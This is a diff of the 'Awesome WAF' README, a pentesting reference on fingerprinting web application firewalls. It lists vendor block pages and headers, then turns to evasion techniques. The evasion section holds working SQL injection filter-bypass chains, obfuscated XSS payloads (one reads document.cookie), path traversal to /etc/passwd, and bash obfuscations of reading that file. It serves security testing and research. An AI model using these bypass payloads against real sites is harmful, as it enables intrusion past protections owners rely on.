@@ -1,11 +1,11 @@
 # Awesome WAF [![Awesome](https://cdn.rawgit.com/sindresorhus/awesome/d7305f38d29fed78fa85652e3a63e154dd8e8829/media/badge.svg "Awesome")](https://github.com/0xinfection/awesome-waf)
 > A curated list of awesome WAF stuff. 🔥
 >
-> __Foreword:__ This was originally my own collection on WAFs. I am open-sourcing it in the hope that it will be useful for pentesters and researchers out there. "The community just learns from each other." __#SharingisCaring__
+> __Foreword:__ This was originally my own collection on WAFs. I am open-sourcing it in the hope that it will be useful for pentesters and researchers out there. You might want to keep this repo on a watch, since it will be updated regularly. "The community just learns from each other." __#SharingisCaring__
 
 ![Main Logo](images/how-wafs-work.png 'How wafs work')
 
-__A Concise Definition:__ A web application firewall is a security policy enforcement point positioned between a web application and the client endpoint. This functionality can be implemented in software or hardware, running in an appliance device, or in a typical server running a common operating system. It may be a stand-alone device or integrated into other network components. *(Source [PCI DSS IS 6.6](https://www.pcisecuritystandards.org/documents/information_supplement_6.6.pdf))*
+__A Concise Definition:__ A web application firewall is a security policy enforcement point positioned between a web application and the client endpoint. This functionality can be implemented in software or hardware, running in an appliance device, or in a typical server running a common operating system. It may be a stand-alone device or integrated into other network components. *(Source: [PCI DSS IS 6.6](https://www.pcisecuritystandards.org/documents/information_supplement_6.6.pdf))*
 
 Feel free to [contribute](CONTRIBUTING.md).
 
@@ -48,7 +48,7 @@ Feel free to [contribute](CONTRIBUTING.md).
 
 ## Testing Methodology:
 ### Where To Look:
-- Always look out for common ports that expose that a WAF `80`, `443`, `8000`, `8008`, `8080`, `8088`.
+- Always look out for common ports that expose that a WAF, namely `80`, `443`, `8000`, `8008`, `8080`, `8088` ports.
     > __Tip:__ You can use automate this easily by commandline using a screenshot taker like [WebScreenShot](https://github.com/maaaaz/webscreenshot).
 - Some WAFs set their own cookies in requests (eg. Citrix Netscaler, Yunsuo WAF).
 - Some associate themselves with separate headers (eg. Anquanbao WAF, Amazon AWS WAF). 
@@ -58,19 +58,23 @@ Feel free to [contribute](CONTRIBUTING.md).
 - Other WAFs reply with unusual response codes upon malicious requests (eg. WebKnight, 360 WAF).
 
 ### Detection Techniques:
+To identify WAFs, we need to (dummy) provoke it.
 1. Make a normal GET request from a browser, intercept and test response headers (specifically cookies).
 2. Make a request from command line (eg. cURL), and test response content and headers (no user-agent included).
-3. If there is a login page somewhere, try some common (easily detectable) payloads like `' or 1 = 1 --`.
-4. If there is some input field somewhere, try with noisy payloads like `<script>alert()</script>`.
-5. Make GET requests with outdated protocols like `HTTP/0.9` (`HTTP/0.9` does not support POST type queries).
-6. Many a times, the WAF varies the `Server` header upon different types of interactions.
-7. Drop Action Technique - Send a raw crafted FIN/RST packet to server and identify response.
+3. Make GET requests to random open ports and grab banners which might expose the WAFs identity.
+4. If there is a login page somewhere, try some common (easily detectable) payloads like `" or 1 = 1 --`.
+5. If there is some input field somewhere, try with noisy payloads like `<script>alert()</script>`.
+6. Attach a dummy `../../../etc/passwd` to a random parameter at end of URL.
+7. Append some catchy keywords like `' OR SLEEP(5) OR '` at end of URLs to any random parameter.
+8. Make GET requests with outdated protocols like `HTTP/0.9` (`HTTP/0.9` does not support POST type queries).
+9. Many a times, the WAF varies the `Server` header upon different types of interactions.
+10. Drop Action Technique - Send a raw crafted FIN/RST packet to server and identify response.
     > __Tip:__ This method could be easily achieved with tools like [HPing3](http://www.hping.org) or [Scapy](https://scapy.net).
-8. Side Channel Attacks - Examine the timing behaviour of the request and response content. 
+11. Side Channel Attacks - Examine the timing behaviour of the request and response content. 
 
 ## WAF Fingerprints
 Wanna detect WAFs? Lets see how.
-> __NOTE__: This section contains manual WAF detection techniques. You might want to switch over to [next section](#awesome-tools). 
+> __NOTE__: This section contains manual WAF detection techniques. You might want to switch over to [next section](#evasion-techniques). 
 
 <table>
     <tr>
@@ -84,7 +88,11 @@ Wanna detect WAFs? Lets see how.
                 <ul>
                     <li>Returns status code <code>493</code> upon unusual requests.</li>
                     <li>On viewing source-code of error page, you will find reference to <code>wzws-waf-cgi/</code> directory.</li>
-                    <li>Source code may contain reference to <code>wangshan.360.cn</code> URL.</li>
+                    <li>Blocked response page source may contain:
+                    <ul>
+                        <li>Reference to <code>wangshan.360.cn</code> URL.</li>
+                        <li><code>Sorry! Your access has been intercepted</code> text snippet.</li>
+                    </ul>
                     <li>Response headers contain <code>X-Powered-By-360WZB</code> Header.</li>
                 </ul>
             </ul>
@@ -118,6 +126,24 @@ Wanna detect WAFs? Lets see how.
                     <ul>
                         <li><code>AL-SESS</code> cookie field name (case insensitive).</li>
                         <li><code>AL-LB</code> value (case insensitive).</li>
+                    </ul>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            Aliyundun Firewall
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability:</b> Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response page contains:</li>
+                    <ul>
+                        <li><code>Sorry, your request has been blocked as it may cause potential threats to the server's security</code> text snippet.</li>
+                        <li>Reference to <code>errors.aliyun.com</code> site URL.</li>
                     </ul>
                 </ul>
             </ul>
@@ -194,7 +220,27 @@ Wanna detect WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            Amazon AWS WAF
+            ASP.NET Generic (IIS)
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Moderate</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Response headers may contain <code>X-ASPNET-Version</code> header value.</li>
+                    <li>Blocked response page content may contain:</li>
+                        <ul>
+                            <li><code>This generic 403 error means that the authenticated user is not authorized to use the requested resource</code>.</li>
+                            <li><code>Error Code 0x00000000<</code> keyword.</li>
+                        </ul>
+                    <li><code>X-Powered-By</code> header has field value set to <code>ASP.NET</code>.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            AWS (Amazon)
         </td>
         <td>
             <ul>
@@ -217,6 +263,25 @@ Wanna detect WAFs? Lets see how.
                 <li><b>Detection Methodology:</b></li>
                 <ul>
                     <li>Response headers contain <code>Yunjiasu-ngnix</code> value.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            Barikode Firewall
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Moderate</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response page content may contain:
+                        <ul>
+                            <li><code>barikode</code> keyword.</li>
+                            <li><code>Forbidden Access</code> text snippet in <code>h1</code>.</li>
+                        </ul>
+                    </li>
                 </ul>
             </ul>
         </td>
@@ -247,6 +312,22 @@ Wanna detect WAFs? Lets see how.
                 <ul>
                     <li>Blocked response headers contains <code>Bekchy - Access Denied</code>.</li>
                     <li>Blocked response page contains reference to <code>https://bekchy.com/report</code>.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            Better WP Security
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Specific to only sites using CMS as Wordpress.</li>
+                    <li>Plugin enumeration reveals the WAF plugin presence.</li>
+                    <li>Making a GET request to <code>wp-content/plugins/better-wp-security/</code> directory yeilds<code>200 OK</code>.</li>
                 </ul>
             </ul>
         </td>
@@ -331,6 +412,20 @@ Wanna detect WAFs? Lets see how.
     </tr>
     <tr>
         <td>
+            CDN NS Application Gateway
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response page contains <code>by CdnNsWAF Application Gateway</code> text snippet.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
             ChinaCache Firewall
         </td>
         <td>
@@ -346,7 +441,26 @@ Wanna detect WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            ACE XML Gateway (Cisco)
+            Chuangyu WAF
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Moderate</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Response page has refernce to:
+                        <ul>
+                            <li><code>365cyd.com</code> or <code>365cyd.net</code> URL.</li>
+                            <li>Help page at <code>http://help.365cyd.com/cyd-error-help.html?code=403</code>.</li>
+                        </ul>
+                    </li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            Cisco ACE XML Gateway
         </td>
         <td>
             <ul>
@@ -434,34 +548,6 @@ Wanna detect WAFs? Lets see how.
     </tr>
     <tr>
         <td>
-            GoDaddy Firewall
-        </td>
-        <td>
-            <ul>
-                <li><b>Detectability: </b>Easy</li>
-                <li><b>Detection Methodology:</b></li>
-                <ul>
-                    <li>Blocked response page contains value<br> <code>Access Denied - GoDaddy Website Firewall</code>.</li>
-                </ul>
-            </ul>
-        </td>
-    </tr>
-    <tr>
-        <td>
-            IBM WebSphere DataPower
-        </td>
-        <td>
-            <ul>
-                <li><b>Detectability: </b>Difficult</li>
-                <li><b>Detection Methodology:</b></li>
-                <ul>
-                    <li>Response headers contains field value value <code>X-Backside-Transport</code> with value <code>OK</code> or <code>FAIL</code>.</li>
-                </ul>
-            </ul>
-        </td>
-    </tr>
-    <tr>
-        <td>
             Deny-All Firewall
         </td>
         <td>
@@ -515,6 +601,20 @@ Wanna detect WAFs? Lets see how.
                 <ul>
                     <li>Blocked response content contains value<br> <code>dotDefender Blocked Your Request</code>.</li>
                     <li>Blocked response headers contain <code>X-dotDefender-denied</code> field value.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            DynamicWeb Injection Check
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response headers contain <code>X-403-Status-By</code> field with value <code>dw-inj-check</code> value.</li>
                 </ul>
             </ul>
         </td>
@@ -583,6 +683,20 @@ Wanna detect WAFs? Lets see how.
     </tr>
     <tr>
         <td>
+            GoDaddy Firewall
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response page contains value<br> <code>Access Denied - GoDaddy Website Firewall</code>.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
             HyperGuard Firewall
         </td>
         <td>
@@ -591,6 +705,20 @@ Wanna detect WAFs? Lets see how.
                 <li><b>Detection Methodology:</b></li>
                 <ul>
                     <li><code>Set-Cookie</code> header has cookie field <code>ODSESSION=</code> in response headers.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            IBM DataPower
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Difficult</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Response headers contains field value value <code>X-Backside-Transport</code> with value <code>OK</code> or <code>FAIL</code>.</li>
                 </ul>
             </ul>
         </td>
@@ -606,6 +734,7 @@ Wanna detect WAFs? Lets see how.
                 <ul>
                     <li>Blocked response page content may contain:</li>
                         <ul>
+                            <li><code>Powered By Incapsula</code> text snippet.</li>
                             <li><code>Incapsula incident ID</code> keyword.</li>
                             <li><code>_Incapsula_Resource</code> keyword.</li>
                             <li><code>subject=WAF Block Page</code> keyword.</li>
@@ -911,6 +1040,38 @@ Wanna detect WAFs? Lets see how.
     </tr>
     <tr>
         <td>
+            Proventia (IBM)
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Difficult</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response page might contain to <code>request does not match Proventia rules</code> text snippet.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            pkSecurityModule IDS
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Moderate</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Response content may contain</li>
+                    <ul>
+                        <li><code>pkSecurityModule: Security.Alert</code>.</li>
+                        <li><code>A safety critical request was discovered and blocked</code> text snippet.</li>
+                    </ul>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
             Radware Appwall
         </td>
         <td>
@@ -980,6 +1141,27 @@ Wanna detect WAFs? Lets see how.
     </tr>
     <tr>
         <td>
+            Sabre Firewall
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Returns status code <code>500 Internal Error</code> upon malicious requests.</li>
+                    <li>Response content has:
+                        <ul>
+                            <li>Contact email <code>dxsupport@sabre.com</code>.</li>
+                            <li><code>Your request has been blocked</code> bold warning.</li>
+                            <li><code>clicking the above email link will automatically add some important details to the email for us to investigate the problem</code> text snippet.</li>
+                        </ul>
+                    </li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
             Safe3 Firewall
         </td>
         <td>
@@ -1039,6 +1221,20 @@ Wanna detect WAFs? Lets see how.
                 <li><b>Detection Methodology:</b></li>
                 <ul>
                     <li>Blocked response page contains <code>SENGINX-ROBOT-MITIGATION</code> keyword.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            Shadow Daemon WAF
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Difficult</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response page contains <code>request forbidden by administrative rules.</code> keyword.</li>
                 </ul>
             </ul>
         </td>
@@ -1199,7 +1395,7 @@ Wanna detect WAFs? Lets see how.
                 <li><b>Detectability: </b>Easy</li>
                 <li><b>Detection Methodology:</b></li>
                 <ul>
-                    <li>Response headers may contain <code>Sucuri</code> or <code>Cloudproxy</code> values.</li>
+                    <li>Response headers may contain <code>Sucuri</code> or <code>Cloudproxy</code> keywords.</li>
                     <li>Blocked response page contains the following text snippet:</li>
                     <ul>
                         <li><code>Access Denied</code> and <code>Sucuri Website Firewall</code> texts.</li>
@@ -1316,7 +1512,7 @@ Wanna detect WAFs? Lets see how.
                     <li>Response page contains:</li>
                     <ul>
                         <li><code>http://cdn.virusdie.ru/splash/firewallstop.png</code> picture.</li>
-                        <li><code>copy; Virusdie.ru</p></code> text snippet.</li>
+                        <li><code>copy; Virusdie.ru</p></code> copyright notice.</li>
                         <li>Response page title contains <code>Virusdie</code> keyword.</li>
                         <li>Page metadata contains <code>name="FW_BLOCK"</code> keyword</li>
                     </ul>
@@ -1374,6 +1570,27 @@ Wanna detect WAFs? Lets see how.
     </tr>
     <tr>
         <td>
+            Wordfence (Feedjit)
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Response headers contain <code>WebKnight</code> keyword.</li>
+                    <li>Blocked response page contains:</li>
+                    <ul>
+                        <li><code>Generated by Wordfence</code> text snippet.</li>
+                        <li><code>A potentially unsafe operation has been detected in your request to this site</code> text warning.</li>
+                        <li><code>Your access to this site has been limited</code> text warning.</li>
+                        <li><code>This response was generated by Wordfence</code> text snippet.</li>
+                    </ul>
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
             WP Cerber Firewall
         </td>
         <td>
@@ -1386,6 +1603,20 @@ Wanna detect WAFs? Lets see how.
                         <li><code>We're sorry, you are not allowed to proceed</code> text snippet.</li>
                         <li><code>Your request looks suspicious or similar to automated requests from spam posting software</code> warning.</li>
                     </ul> 
+                </ul>
+            </ul>
+        </td>
+    </tr>
+    <tr>
+        <td>
+            Xuanwudun WAF
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response page contains reference to <code>http://admin.dbappwaf.cn/index.php/Admin/ClientMisinform/</code> site URL.</li>
                 </ul>
             </ul>
         </td>
@@ -1434,6 +1665,27 @@ Wanna detect WAFs? Lets see how.
             </ul>
         </td>
     </tr>
+    <tr>
+        <td>
+            ZScaler (Accenture)
+        </td>
+        <td>
+            <ul>
+                <li><b>Detectability: </b>Easy</li>
+                <li><b>Detection Methodology:</b></li>
+                <ul>
+                    <li>Blocked response page contains:</li>
+                    <ul>
+                        <li><code>Access Denied: Accenture Policy</code> text.</li>
+                        <li>Reference to <code>https://policies.accenture.com</code> URL.</li>
+                        <li><code>Your organization has selected Zscaler to protect you from internet threats</code>.</li>
+                        <li><code>The Internet site you have attempted to access is prohibited. Accenture's webfilters indicate that the site likely contains content considered inappropriate</code>.</li>
+                    </ul> 
+                    <li><code>Server</code> header has value set to <code>ZScaler</code>.</li>
+                </ul>
+            </ul>
+        </td>
+    </tr>
 </table>
 
 ## Evasion Techniques
@@ -1468,54 +1720,54 @@ Running a set of payloads against the URL/endpoint. Some nice fuzzing wordlists:
 
 ### Keyword Filter Detection/Bypass
 
-__Example__: SQL Injection
+__Case__: SQL Injection
 
 ##### • Step 1:
 __Keywords Filtered__: `and`, `or`, `union`  
-- __Filtered Injection__: `union select user, password from users`
+- __Blocked Attempt__: `union select user, password from users`
 - __Bypassed Injection__: `1 || (select user from users where user_id = 1) = 'admin'`
 
 ##### • Step 2:
 __Keywords Filtered__: `and`, `or`, `union`, `where`  
-- __Filtered Injection__: `1 || (select user from users where user_id = 1) = 'admin'`
+- __Blocked Attempt__: `1 || (select user from users where user_id = 1) = 'admin'`
 - __Bypassed Injection__: `1 || (select user from users limit 1) = 'admin'`
 
 ##### • Step 3:
 __Keywords Filtered__: `and`, `or`, `union`, `where`, `limit`  
-- __Filtered Injection__: `1 || (select user from users limit 1) = 'admin'`
+- __Blocked Attempt__: `1 || (select user from users limit 1) = 'admin'`
 - __Bypassed Injection__: `1 || (select user from users group by user_id having user_id = 1) = 'admin'`
 
 ##### • Step 4:
 __Keywords Filtered__: `and`, `or`, `union`, `where`, `limit`, `group by`  
-- __Filtered Injection__: `1 || (select user from users group by user_id having user_id = 1) = 'admin'`
+- __Blocked Attempt__: `1 || (select user from users group by user_id having user_id = 1) = 'admin'`
 - __Bypassed Injection__: `1 || (select substr(group_concat(user_id),1,1) user from users ) = 1`
 
 ##### • Step 5:
 __Keywords Filtered__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`  
-- __Filtered Injection__: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
+- __Blocked Attempt__: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
 - __Bypassed Injection__: `1 || 1 = 1 into outfile 'result.txt'`
 - __Bypassed Injection__: `1 || substr(user,1,1) = 'a'`
 
 ##### • Step 6:
 __Keywords Filtered__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`  
-- __Filtered Injection__: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
+- __Blocked Attempt__: `1 || (select substr(gruop_concat(user_id),1,1) user from users) = 1`
 - __Bypassed Injection__: `1 || user_id is not null`
 - __Bypassed Injection__: `1 || substr(user,1,1) = 0x61`
 - __Bypassed Injection__: `1 || substr(user,1,1) = unhex(61)`
 
 ##### • Step 7:
 __Keywords Filtered__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`  
-- __Filtered Injection__: `1 || substr(user,1,1) = unhex(61)`
+- __Blocked Attempt__: `1 || substr(user,1,1) = unhex(61)`
 - __Bypassed Injection__: `1 || substr(user,1,1) = lower(conv(11,10,36))`
 
 ##### • Step 8:
 __Keywords Filtered__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`, `substr`  
-- __Filtered Injection__: `1 || substr(user,1,1) = lower(conv(11,10,36))`
+- __Blocked Attempt__: `1 || substr(user,1,1) = lower(conv(11,10,36))`
 - __Bypassed Injection__: `1 || lpad(user,7,1)`
 
 ##### • Step 9:
 __Keywords Filtered__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`, `'`, `hex`, `substr`, `white space`  
-- __Filtered Injection__: `1 || lpad(user,7,1)`
+- __Blocked Attempt__: `1 || lpad(user,7,1)`
 - __Bypassed Injection__: `1%0b||%0blpad(user,7,1)`
 
 ### Obfuscation:
@@ -1532,7 +1784,7 @@ __Standard__: `<script>alert()</script>`
 __Bypassed__: `<ScRipT>alert()</sCRipT>`
 
 __Standard__: `SELECT * FROM all_tables WHERE OWNER = 'DATABASE_NAME'`  
-__Bypassed__: `sELecT * FrOM all_tables whERe OwNeR = 'DATABASE_NAME'`
+__Bypassed__: `sELecT * FrOM all_tables whERe OWNER = 'DATABASE_NAME'`
 
 __2. URL Encoding__  
 - Encode normal payloads with % encoding/URL encoding.
@@ -1551,10 +1803,13 @@ __3. Unicode Encoding__
 - You can encode entire/part of the payload for obtaining results.
 
 __Standard__: `prompt()`  
-__Obfuscated__: `pro\u006dpt()`
+__Obfuscated__: `\u0070r\u06f\u006dpt()`
 
-__Standard__: `../../appusers.txt`  
-__Obfuscated__: `%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFappusers.txt`
+__Blocked__: `/?redir=http://google.com`  
+__Bypassed__: `/?redir=http://google。com`
+
+__Standard__: `../../etc/passwd`  
+__Obfuscated__: `%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFpasswd`
 
 __4. HTML Encoding__
 - Often web apps encode special characters into HTML encoding and render accordingly.
@@ -1612,8 +1867,11 @@ __9. String Concatenation__
 - Different programming languages have different syntaxes and patterns for concatenation.
 - This allows us to effectively generate payloads that can bypass many filters and rules.
 
+__Standard__: `<svg/onload-location=javascript:alert%281%29;//`  
+__Obfuscated__: ```<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//```
+
 __Standard__: `/bin/cat /etc/passwd`  
-__Obfuscated__: `/bi'n/c'at' /e'tc'/pa'''ss'wd`
+__Obfuscated__: `/bi'n'''/c''at' /e'tc'/pa'''ss'wd`
 > Bash allows path concatenation for execution.
 
 __Standard__: `<iframe/onload='this["src"]="javascript:alert()"';>`  
@@ -1621,13 +1879,17 @@ __Obfuscated__: `<iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:al"+"er"+"t(
 
 __9. Junk Chars__
 - Normal payloads get filtered out easily.
-- Adding some junk chars avoid detection (specific cases only).
+- Adding some junk chars helps avoid detection (specific cases only).
+- They often help in confusing regex based firewalls.
 
 __Standard__: `<script>alert()</script>`  
 __Obfuscated__: `<script>+-+-1-+-+alert(1)</script>`
 
+__Standard__: `<BODY onload=alert()>`  
+__Obfuscated__: ```<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert()>```
+
 __Standard__: `<a href=javascript;alert()>ClickMe `  
-__Bypassed__: `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe`
+__Bypassed__: `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe`
 
 __10. Line Breaks__
 - Many WAF with regex based filtering effectively blocks many attempts.
@@ -1637,12 +1899,42 @@ __Standard__: `<iframe src=javascript:alert(0)">`
 __Obfuscated__: `<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">`
 
 __11. Uninitialized Variables__
-- Uninitialized bash variables can elude regular expression based filters and pattern match.
+- Uninitialized bash variables can evade bad regular expression based filters and pattern match.
 - Uninitialised variables have value null/they act like empty strings.
 - Both bash and perl allow this kind of interpretations.
 
-__Standard__: `cat /etc/passwd`  
-__Obfuscated__: `cat$u $u/etc$u/passwd$u`
+> __BONUS:__ Variable names can have any number of random characters. I have represented them here as `$aaaaaa`, `$bbbbbb`, and so on. You can replace them with any number of random chars like `$ushdjah` and so on.  ;)
+
+- __Level 1 Obfuscation__: Normal  
+__Standard__: `/bin/cat /etc/passwd`  
+__Obfuscated__: `/bin/cat$u /etc/passwd$u`
+
+- __Level 2 Obfuscation__: Postion Based  
+__Standard__: `/bin/cat /etc/passwd`  
+__Obfuscated__: <code>$u<b>/bin</b>$u<b>/cat</b>$u $u<b>/etc</b>$u<b>/passwd</b>$u</code>
+
+- __Level 3 Obfuscation__: Random chars   
+__Standard__: `/bin/cat /etc/passwd`  
+__Obfuscated__: <code>$aaaaaa<b>/bin</b>$bbbbbb<b>/cat</b>$ccccccc $dddddd<b>/etc</b>$eeeeeee<b>/passwd</b>$fffffff</code>
+
+An exotic payload crafted:
+```
+$sdijchkd/???$sdjhskdjh/??t$skdjfnskdj $sdofhsdhjs/???$osdihdhsdj/??ss??$skdjhsiudf
+```
+
+__12. Random Tabs__
+- Tabs often help to evade firewalls especially regex based ones.
+- Tabs can help break firewall regex when the regex is expecting whitespaces and not tabs.
+
+__Standard__: `<IMG SRC="javascript:alert();">`  
+__Bypassed__: `<IMG SRC="    javascript:alert();">`  
+__Variant__: `<IMG SRC="    jav    ascript:alert    ();">`
+
+__Standard__: `<iframe src=javascript:alert(1)></iframe>`  
+__Obfuscated__: 
+```
+<iframe  src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:a&Tab;l&Tab;e&Tab;r&Tab;t&Tab;%28&Tab;1&Tab;%29></iframe>
+```
 
 ### Browser Bugs:
 #### Charset Bugs:
@@ -1659,9 +1951,7 @@ Accept-Language: en-US,en;q=0.5
 Accept-Encoding: gzip, deflate
 </pre>
 When the site loads, it will be encoded to the UTF-32 encoding that we set, and
-then as the output encoding of the page is utf-8, it will be rendered as: `"<script>alert (1) </ script>`.
-
-Final URL encoded payload: `%E2%88%80%E3%B8%80%E3%B0%80script%E3%B8%80alert(1)%E3%B0%80/script%E3%B8%80`
+then as the output encoding of the page is UTF-8, it will be rendered as: `<svg/onload=alert()>` which will trigger XSS.
 
 #### Null Bytes:
 - The null bytes are commonly used as string terminator.
@@ -1768,6 +2058,10 @@ Before anything else, you should hone up skills from [Google Dorks Cheat Sheet](
 - XSS Bypass by [@ArbazKiraak](https://twitter.com/ArbazKiraak)
 ```
 <a href="j&Tab;a&Tab;v&Tab;asc&NewLine;ri&Tab;pt&colon;\u0061\u006C\u0065\u0072\u0074&lpar;this['document']['cookie']&rpar;">X</a>`
+```
+- XSS Bypass by [@Ahmet Ümit](https://twitter.com/ahmetumitbayram)
+```
+<--`<img/src=` onerror=confirm``> --!>
 ```
 
 ### Comodo 
@@ -2009,19 +2303,19 @@ User-Agent: Mozilla/4.0 (compatible; MSIE5.01; Windows NT)
 ### Fingerprinting:
 __1. Fingerprinting with [NMap](https://nmap.org)__:  
 Source: [GitHub](https://github.com/nmap/nmap) | [SVN](http://svn.nmap.org)
-- Normal WAF Fingerprinting  
+- Normal WAF fingerprinting  
 `nmap --script=http-waf-fingerprint <target>`
 
-- Intensive WAF Fingerprinting  
+- Intensive WAF fingerprinting  
 `nmap --script=http-waf-fingerprint  --script-args http-waf-fingerprint.intensive=1 <target>`
 
-- Generic Detection  
+- Generic detection  
 ` nmap --script=http-waf-detect <target>`
 
-__2. Fingerprinting with [WafW00f](https://github.com/EnableSecurity/wafw00f)__:  
-Source: [GitHub](https://github.com/enablesecurity/wafw00f) | [Pypi](https://pypi.org/project/wafw00f)
+__2. Fingerprinting with [identYwaf](https://github.com/stamparm/identywaf)__:  
+Source: [GitHub](https://github.com/stamparm/identywaf)
 ```
-wafw00f <target>
+python identYwaf.py --delay=2 --proxy=<proxy> <target>
 ```
 
 ### Testing:
@@ -2108,7 +2402,7 @@ X-Remote-Addr: 127.0.0.1
 ### Research Papers:
 - [Protocol Level WAF Evasion](papers/Qualys%20Guide%20-%20Protocol-Level%20WAF%20Evasion.pdf) - A protocol level WAF evasion techniques and analysis by [Qualys](https://www.qualys.com).
 - [Neural Network based WAF for SQLi](papers/Artificial%20Neural%20Network%20based%20WAF%20for%20SQL%20Injection.pdf) - A paper about building a neural network based WAF for detecting SQLi attacks.
-- [Bypassing Web Application Firewalls with HTTP Parameter Pollution](papers/Bypassing%20Web%20Application%20Firewalls%20with%20HTTP%20Parameter%20Pollution.pdf) - A ressearch paper from [Exploit DB](https://exploit-db.com) about effectively bypassing WAFs via HTTP Parameter Pollution.
+- [Bypassing Web Application Firewalls with HTTP Parameter Pollution](papers/Bypassing%20Web%20Application%20Firewalls%20with%20HTTP%20Parameter%20Pollution.pdf) - A research paper from [Exploit DB](https://exploit-db.com) about effectively bypassing WAFs via HTTP Parameter Pollution.
 - [Poking A Hole in the Firewall](papers/Poking%20A%20Hole%20In%20The%20Firewall.pdf) - A paper by [Rafay Baloch](https://www.rafaybaloch.com) about modern firewall analysis.
 - [Modern WAF Fingerprinting and XSS Filter Bypass](papers/Modern%20WAF%20Fingerprinting%20and%20XSS%20Filter%20Bypass.pdf) - A paper by [Rafay Baloch](https://www.rafaybaloch.com) about WAF fingerprinting and bypassing XSS filters.
 - [WAF Evasion Testing](papers/SANS%20Guide%20-%20WAF%20Evasion%20Testing.pdf) - A WAF evasion testing guide from [SANS](https://www.sans.org).
